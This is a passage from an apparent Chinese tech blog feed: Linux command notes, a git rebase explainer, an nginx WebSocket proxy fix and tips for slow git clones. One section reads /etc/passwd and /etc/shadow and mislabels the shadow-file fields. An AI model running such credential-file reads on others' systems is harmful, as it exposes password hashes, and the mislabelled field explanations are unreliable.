example.zip</span><br></pre></td></tr></table></figure><p>将压缩文件<code>example.zip</code>在指定目录<code>/tmp</code>下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -n example.zip -d &#x2F;tmp</span><br></pre></td></tr></table></figure><p>将压缩文件<code>example.zip</code>在当前目<code>dir</code>下解压，如果已有相同的文件，不询问，直接覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -o example.zip -d</span><br></pre></td></tr></table></figure><p><code>-o</code> 参数表示不必先询问用户，unzip执行后覆盖原有的文件；<br><code>-d</code> 参数指定文件解压缩后所要存储的目录；<br><code>-n</code> 参数解压缩时不要覆盖原有的文件；</p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>tar 命令可以为linux 文件和目录创建档案。</p><p>利用tar命令，可以把一大堆的文件和目录全部打包成一个文件。</p><p>需要明确的两个概念是：打包和压缩是不同的两件事。</p><ul><li>打包：是指将一大堆文件或目录变成一个总的文件；</li><li>压缩：则是将一个大文件通过压缩算法变成一个小文件。</li></ul><p>为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>仅打包，不压缩。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf test.tar 20200323.log</span><br></pre></td></tr></table></figure><p><code>test.tar</code>这个文件名是自定义的，只是习惯上我们使用<code>.tar</code>作为包文件。</p><h3 id="打包并压缩"><a href="#打包并压缩" class="headerlink" title="打包并压缩"></a>打包并压缩</h3><p>打包，且压缩。<code>-z</code>参数表示以<code>.tar.gz</code>或者<code>.tgz</code>后缀名代表<code>gzip</code>压缩过的<code>tar</code>包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zcvf test.tar.gz 20200323.log</span><br></pre></td></tr></table></figure><p>打包，且压缩。<code>-j</code>参数表示以<code>.tar.bz2</code>后缀名作为<code>tar</code>包名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -jcvf test.tar.bz2 20200323.log</span><br></pre></td></tr></table></figure><h3 id="查看包内容"><a href="#查看包内容" class="headerlink" title="查看包内容"></a>查看包内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -ztvf test.tar.gz</span><br></pre></td></tr></table></figure><p>因为使用<code>gzip</code>命令压缩的<code>test.tar.gz</code>，所以查看压缩包时需要加上<code>-z</code>参数。</p><blockquote><p>如何只解压部分文件？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -ztvf test.tar.gz 20200323.log</span><br></pre></td></tr></table></figure><p>这种方式仅限于取一个文件。</p><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>在该目录下直接解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf test.tar.gz</span><br></pre></td></tr></table></figure><p>解压至指定文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf test.tar.gz -C log</span><br><span class="line">$ ls log</span><br><span class="line">20200323.log</span><br></pre></td></tr></table></figure><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p><code>.gz</code>压缩包（不带tar），需要使用gzip 命令去解压。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip test.gz -d &#x2F;&lt;filename&gt;</span><br></pre></td></tr></table></figure><p><code>-d</code> 参数用于指定解压位置</p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>如何查看Linux 的发行版本？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsb_release -a</span><br></pre></td></tr></table></figure><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>crontab 命令被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似。</p><h2 id="w"><a href="#w" class="headerlink" title="w"></a>w</h2><p>w命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。</p><p>不带任何参数，会显示当前登入系统的所有用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ w</span><br><span class="line"> 10:54:39 up 14 days, 22:39, 2 users,  load average: 0.18, 0.09, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">wangyh   pts&#x2F;0    113.87.129.118   10:27   25:10   2.77s  2.76s top</span><br><span class="line">Boo      pts&#x2F;1    113.87.129.118   10:54    1.00s  0.00s  0.00s w</span><br></pre></td></tr></table></figure><p>第一行显示的字段信息分别是：</p><ul><li><input checked="" disabled="" type="checkbox"> 10:50:39：系统当前时间</li><li><input checked="" disabled="" type="checkbox"> up 2:02： 系统已运行时间</li><li><input checked="" disabled="" type="checkbox"> 2 user：当前在线用户个数</li><li><input checked="" disabled="" type="checkbox"> load average：系统的平均负载，3个数值分别对应系统在过去的1,5,10分钟内的负载程度，数值越大，表明系统的负载越大。</li></ul><p>第二行几个字段分别表示：</p><ul><li><input checked="" disabled="" type="checkbox"> USER ： 登陆用户的账户名</li><li><input checked="" disabled="" type="checkbox"> TTY： 用户登陆所使用的终端</li><li><input checked="" disabled="" type="checkbox"> FROM： 显示用户从何处登陆，用户的IP地址</li><li><input checked="" disabled="" type="checkbox"> LOGIN@：显示用户登陆入系统时的时间</li><li><input checked="" disabled="" type="checkbox"> IDLE：用户空闲时长，从上一次该用户的任务结束后开始计时，以hour为单位</li><li><input checked="" disabled="" type="checkbox"> JCPU：表示在某段时间内，当前用户所有的进程任务所消耗的CPU时间</li><li><input checked="" disabled="" type="checkbox"> PCPU：表示在某段时间内，当前用户正在执行的进程任务所消耗的CPU时间</li><li><input checked="" disabled="" type="checkbox"> WHAT：表示用户正在执行的任务</li></ul><h2 id="who"><a href="#who" class="headerlink" title="who"></a>who</h2><p>who 命令用于查看目前登入系统的用户信息，与<code>w</code>命令类似。</p><p>显示当前登入系统中的所有用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ who</span><br><span class="line">wangyh   pts&#x2F;0        2019-04-19 10:27 (113.87.129.118)</span><br><span class="line">Boo      pts&#x2F;1        2019-04-19 10:54 (113.87.129.118)</span><br></pre></td></tr></table></figure><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><p><code>-m</code>：效果等同于执行<code>whoami</code>命令<br><code>-q或--count</code>：只显示登入系统的帐号名称和总人数；<br><code>-H</code>：增加显示用户信息状态栏</p><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><p>last 命令用于查看用户最近的登入信息</p><p>输出最后10 条登入信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ last -3</span><br><span class="line">Boo      pts&#x2F;1        113.87.129.118   Fri Apr 19 10:54   still logged in</span><br><span class="line">wangyh   pts&#x2F;0        113.87.129.118   Fri Apr 19 10:27   still logged in</span><br><span class="line">wangyh   pts&#x2F;5        113.87.129.118   Fri Apr 19 10:24 - 10:27  (00:02)</span><br></pre></td></tr></table></figure><p>查看指定用户的登入信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ last Boo -3</span><br><span class="line">Boo      pts&#x2F;1        113.87.129.118   Fri Apr 19 10:54   still logged in</span><br><span class="line">Boo      pts&#x2F;4        113.87.129.118   Fri Apr 19 10:23 - 10:26  (00:03)</span><br><span class="line">Boo      pts&#x2F;4        113.87.129.118   Fri Apr 19 10:14 - 10:22  (00:08)</span><br></pre></td></tr></table></figure><h2 id="pkill"><a href="#pkill" class="headerlink" title="pkill"></a>pkill</h2><p>pkill命令可以按照进程名杀死进程，可以用于踢出当前登入系统的用户。</p><h3 id="安全的踢出用户"><a href="#安全的踢出用户" class="headerlink" title="安全的踢出用户"></a>安全的踢出用户</h3><p>可以使用<code>pkill</code>命令踢出当前正登入系统中的用户，但是这么做很危险，更好的解决办法是：<br>先查看终端号，然后查看该终端执行的所有进程，根据进程号来停止服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef| grep pts&#x2F;0</span><br><span class="line">$ kill -9 pid</span><br></pre></td></tr></table></figure><h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><p>passwd 命令用于设置用户的认证信息，包括用户密码、密码过期时间等。</p><p>系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。</p><h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p>ss 命令用来显示处于活动状态的套接字信息。ss 命令可以用来获取socket 统计信息，它可以显示和netstat 类似的内容。但ss 的优势在于它能够显示更多更详细的有关TCP 和连接状态的信息，而且比netstat 更快速更高效。</p><p>显示所有的tcp 套接字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -t -a</span><br></pre></td></tr></table></figure><p>显示Socket 摘要</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -s</span><br></pre></td></tr></table></figure><p>列出所有打开的网络连接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -l</span><br></pre></td></tr></table></figure><p>找出打开套接字/端口应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -pl | grep 6666</span><br></pre></td></tr></table></figure><h2 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h2><p>存放用户信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;passwd</span><br><span class="line">$ cat &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p>用户信息文件分析（每项用:隔开）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jack:X:503:504:::&#x2F;home&#x2F;jack&#x2F;:&#x2F;bin&#x2F;bash</span><br><span class="line">jack　　&#x2F;&#x2F;用户名</span><br><span class="line">X　　&#x2F;&#x2F;口令、密码</span><br><span class="line">503　　&#x2F;&#x2F;用户id（0代表root、普通新建用户从500开始）</span><br><span class="line">504　　&#x2F;&#x2F;所在组</span><br><span class="line">:　　&#x2F;&#x2F;描述</span><br><span class="line">&#x2F;home&#x2F;jack&#x2F;　　&#x2F;&#x2F;用户主目录</span><br><span class="line">&#x2F;bin&#x2F;bash　　&#x2F;&#x2F;用户缺省Shell</span><br></pre></td></tr></table></figure><p>存放组信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;group</span><br><span class="line">cat &#x2F;etc&#x2F;gshadow</span><br></pre></td></tr></table></figure><p>用户组信息文件分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jack:$!$:???:13801:0:99999:7:*:*:</span><br><span class="line">jack　　&#x2F;&#x2F;组名</span><br><span class="line">$!$　　&#x2F;&#x2F;被加密的口令</span><br><span class="line">13801　　&#x2F;&#x2F;创建日期与今天相隔的天数</span><br><span class="line">0　　&#x2F;&#x2F;口令最短位数</span><br><span class="line">99999　　&#x2F;&#x2F;用户口令</span><br><span class="line">7　　&#x2F;&#x2F;到7天时提醒</span><br><span class="line">*　　&#x2F;&#x2F;禁用天数</span><br><span class="line">*　　&#x2F;&#x2F;过期天数</span><br></pre></td></tr></table></figure><p>如果是普通用户执行passwd只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用passwd用户名，注意要以root用户的权限来创建。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改boo 用户的密码</span><br><span class="line">$ passwd boo</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://www.cnblogs.com/peida/archive/2013/03/18/2965369.html#4235146" target="_blank" rel="noopener">Wget 命令</a></li><li><a href="http://man.linuxde.net/scp" target="_blank" rel="noopener">SCP 命令</a></li><li><a href="http://man.linuxde.net/last" target="_blank" rel="noopener">last 命令</a></li><li><a href="http://man.linuxde.net/who" target="_blank" rel="noopener">who 命令</a></li><li><a href="http://man.linuxde.net/pkill" target="_blank" rel="noopener">pkill 命令</a></li><li><a href="http://man.linuxde.net/ss" target="_blank" rel="noopener">ss 命令</a></li><li><a href="https://blog.csdn.net/kinggaiwusi/article/details/76919854" target="_blank" rel="noopener">permission denied,please try again</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Linux Commands" scheme="https://www.0x2beace.com/tags/Linux-Commands/"/>
    
  </entry>
  
  <entry>
    <title>Git 变基命令详解</title>
    <link href="https://www.0x2beace.com/detailed-explanation-of-git-rebase-commands/"/>
    <id>https://www.0x2beace.com/detailed-explanation-of-git-rebase-commands/</id>
    <published>2020-08-24T12:06:20.000Z</published>
    <updated>2020-08-25T12:10:32.469Z</updated>
    
    <content type="html"><![CDATA[<p>“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><p>问题描述：有时候我们在本地提交完代码，下一个操作是需要推送到远程仓库，这时如果远程仓库已经有了更新的提交，那么当我们执行完<code>git push</code> 命令之后，不出意外会出现以下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">! [rejected]        master -&gt; master (fetch first)</span><br><span class="line">error: failed to push some refs to &#39;git@gitlab.com:invest2&#x2F;invest_home.git&#39;</span><br><span class="line">hint: Updates were rejected because the remote contains work that you do</span><br><span class="line">hint: not have locally. This is usually caused by another repository pushing</span><br><span class="line">hint: to the same ref. You may want to first integrate the remote changes</span><br><span class="line">hint: (e.g., &#39;git pull ...&#39;) before pushing again.</span><br><span class="line">hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details.</span><br></pre></td></tr></table></figure><p>这时错误的意思是：推送失败，你需要先将远程仓库最新的提交更新到本地仓库，然后才能 <code>git push</code>。</p><p>所以这个时候你有两个选择：</p><ol><li>使用<code>git pull</code> 自动合并</li><li>使用<code>git fetch</code> 手动合并</li></ol><p>前者虽然用起来很方便，但是自动合并会留下一次合并记录，类似这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Merge branch &#39;master&#39; of bitbucket.org:maxt2013&#x2F;invest_home</span><br></pre></td></tr></table></figure><p>虽然这并不会影响什么，但如果你很重视 <code>commit logs</code>，那么这样的一次记录，是不被容忍的。</p><p>后者通过手动合并，确实可以做到没有多余的合并记录，但是每次手动合并有比较麻烦，那么有没有什么折中的方式，既可以不留下多余的记录，有比较省事。</p><p>答案是有的，它就是我们下面要介绍的“变基”。</p><h2 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h2><p>下面这条命令会将远程仓库中最新的提交合并到本地仓库，<code>--rebase</code>参数的作用是先取消 commit 记录，并把它们临时保存为补丁（patch），这些补丁放在 <code>.git/rebase</code>目录中，等远程仓库同步至本地之后，最后才将补丁合并到本地仓库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p>下面用图来解释具体发生了什么。</p><p><code>git pull</code> 之前的情况：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134641.png" alt=""></p><p>使用 <code>git pull --rebase origin</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134808.png" alt=""></p><p>最后使用 <code>git push</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134934.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>如果你对 <code>commit logs</code>有强烈的控制欲望，那么变基命令是适合你的，如果你是使用git 的新手，或者你不在意 <code>commit logs</code>，那么直接使用 <code>git pull</code> 自动合并就好了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/MBuger/article/details/70197532" target="_blank" rel="noopener">git push错误failed to push some refs to的解决</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Socket.io 连接异常：Error during WebSocket handshake Unexpected response code 400</title>
    <link href="https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/"/>
    <id>https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/</id>
    <published>2020-08-23T02:34:50.000Z</published>
    <updated>2020-08-23T02:43:00.235Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间线上的生产环境遇到一个问题：<code>Error during WebSocket handshake: Unexpected response code: 400</code>。</p><p>起初我没太在意，以为就是正常的 <code>socket.io</code> 连接断开了。</p><p>直到我发现 <code>socker.io</code> 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。</p><a id="more"></a><h2 id="nginx-作为wbsocket-代理"><a href="#nginx-作为wbsocket-代理" class="headerlink" title="nginx 作为wbsocket 代理"></a>nginx 作为wbsocket 代理</h2><p>经过一番查找，了解到 nginx 在作为反向代理时，如果需要使用 <code>wss</code>，那么还需要额外加一段配置。</p><blockquote><p>NGINX supports WebSocket by allowing a tunnel to be set up between a client and a backend server. For NGINX to send the Upgrade request from the client to the backend server, the Upgrade and Connection headers must be set explicitly.  —— Nginx 官网</p></blockquote><p>翻译过来就是：nginx 通过允许在客户端和后端服务器之间建立连接来支持 websocket 通讯，为了使 nginx 将升级请求从客户端发送到后端服务器，必须明确设置 Upgrade 和 Connection 标头。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">  proxy_pass http:&#x2F;&#x2F;wsbackend;</span><br><span class="line">  </span><br><span class="line">  proxy_http_version 1.1;</span><br><span class="line">  proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">  proxy_set_header Connection &quot;Upgrade&quot;;</span><br><span class="line">  proxy_set_header Host $host;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行是 nginx 反向代理的配置，后面四行才是这个问题的解决方案。</p><p>仔细想一想，因为本地没有 https 的概念，并没有发现这个问题，而线上是有配置证书的，所以暴露出了这个问题。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>socket.io</code> 的请求并没有真正达到，请求发出之后中间为什么没有到达节点，这个是解决问题的关键。</p><p>为了使 nginx 正确处理 <code>socket.io</code> 所需要做的就是正确设置标头，以处理将连接从 http 升级到 websocket 的请求。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.nginx.com/blog/websocket-nginx/" target="_blank" rel="noopener">Nginx 作为Websocket 反向代理</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;前段时间线上的生产环境遇到一个问题：&lt;code&gt;Error during WebSocket handshake: Unexpected response code: 400&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;起初我没太在意，以为就是正常的 &lt;code&gt;socket.io&lt;/code&gt; 连接断开了。&lt;/p&gt;
&lt;p&gt;直到我发现 &lt;code&gt;socker.io&lt;/code&gt; 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。&lt;/p&gt;</summary>
    
    
    
    <category term="Socket.io" scheme="https://www.0x2beace.com/categories/Socket-io/"/>
    
    <category term="Nginx" scheme="https://www.0x2beace.com/categories/Socket-io/Nginx/"/>
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
    <category term="Socket.io" scheme="https://www.0x2beace.com/tags/Socket-io/"/>
    
    <category term="wss" scheme="https://www.0x2beace.com/tags/wss/"/>
    
  </entry>
  
  <entry>
    <title>Git Clone 太慢怎么办？</title>
    <link href="https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/"/>
    <id>https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/</id>
    <published>2020-08-19T14:29:15.000Z</published>
    <updated>2020-09-08T01:31:21.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在使用git 时，需要克隆<code>Bitbucket</code>的一个仓库，于是像往常一样打开了<code>iTerm</code>，便放在一边了。<br>直到一个小时后，我才想起来，想着应该克隆完了，打开才发现百分之一都没下载完。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908092611.png" alt="git clone 失败"></p><p>强大的长城技术对GitHub、Bitbucket 这类源代码托管服务平台网开一面，并没有像Google、FaceBook那样直接一刀切，但是它做了严格的限速，这种折磨简直比无法访问更难受。</p><p>上图中<code>git clone</code>的速度从来没有超过 <code>10k/s</code>，这也就意味着一个 <code>100M</code> 的项目，需要近三个小时才能下载完，而且由于网络的不稳定性，下载过程中偶尔会出现断开连接的情况，由于<code>git clone</code> 不支持端点续传，这就会导致前几个小时的下载量完全浪费掉了，只能重新开始下载。</p><p>这篇文章主要用来介绍几种方式可以快速的克隆远程仓库。</p><h3 id="浅复制"><a href="#浅复制" class="headerlink" title="浅复制"></a>浅复制</h3><p><code>git clone</code>默认会下载项目的完整历史版本，如果你只关心代码，而不关心历史信息，那么可以使用 git 的浅复制功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;bcit-ci&#x2F;CodeIgniter.git</span><br></pre></td></tr></table></figure><p><code>--depth=1</code> 表示只下载最近一次的版本，使用浅复制可以大大减少下载的数据量，例如，CodeIgniter 项目完整下载有近 100MiB ，而使用浅复制只有 5MiB 多，这样即使在恶劣的网络环境下，也可以快速的获得代码。</p><p>如果之后又想获取完整历史信息，可以使用下面的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch --unshallow</span><br></pre></td></tr></table></figure><p>或者，如果你只想下载最新的代码，你也可以直接从远程仓库下载打包好的<code>zip</code>文件，这会比浅复制更快，因为它只包含了最新的代码文件，而且<code>zip</code>是压缩文件。但是很显然，使用浅复制会灵活一些。</p><h3 id="GUI-工具"><a href="#GUI-工具" class="headerlink" title="GUI 工具"></a>GUI 工具</h3><p>如果你有幸正在使用代理，懂得如何科学上网的话，那么访问<code>GitHub</code>、<code>Bitbucket</code>对你来说应该不在话下。</p><p>从源代码托管服务平台下载项目最简单的方法就是使用一款图形化界面（<code>GUI</code>）的Git工具。</p><p>使用<code>GUI</code>工具方便之处就在于，可以在设置中直接配置是否使用代理。或者直接将代理配置尾系统代理。</p><h3 id="http-https-proxy"><a href="#http-https-proxy" class="headerlink" title="http/https proxy"></a>http/https proxy</h3><p>如果你跟我一样，更喜欢使用原生的<code>git</code>命令，喜欢使用在命令行下操作的那种感觉，那么你也可以在命令行下直接配置代理。</p><p>这里也有两种方式，根据实际情况自行选择。</p><h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">$ git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087</span><br></pre></td></tr></table></figure><p>或者直接编辑<code>~/.gitconifg</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.gitconfig</span><br><span class="line"></span><br><span class="line">[http]</span><br><span class="line">proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">[https]</span><br><span class="line">proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087</span><br></pre></td></tr></table></figure><h4 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086</span><br><span class="line">$ git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086</span><br></pre></td></tr></table></figure><p>其中，<code>1087</code>、<code>1086</code>分别是你本地机器的 <code>http</code>、<code>socks5</code>代理的端口号。 </p><p>另外，如果想取消设置，可以输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global --unset http.proxy</span><br><span class="line">$ git conifg --global --unset https.proxy</span><br></pre></td></tr></table></figure><p>配置完成后，重新 <code>clone</code>一遍，可以看到速度得到了极大的提升。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908092634.png" alt="git clone 成功"></p><blockquote><p>注意⚠️</p></blockquote><p>上面这种配置方式仅适用于 <code>https</code>协议，如果你在<code>clone</code>时选择<code>ssh</code>协议，那么速度仍然会很慢。</p><h3 id="替换域名"><a href="#替换域名" class="headerlink" title="替换域名"></a>替换域名</h3><p>如果你觉得上面的方式太麻烦了，或者是你没有代理，那么可以试试下面这种方式。</p><p>这种方式简单暴力，替换就可以直接使用，使用规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 原地址</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;996icu&#x2F;996.ICU.git</span><br><span class="line"></span><br><span class="line"># 替换成</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;996icu&#x2F;996.ICU.git</span><br></pre></td></tr></table></figure><p>只需要在<code>github.com</code>后面追加一个<code>.cnpmjs.org</code>就可以了。</p><p>以上就是<code>git clone</code>太慢时的各种解决办法。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a 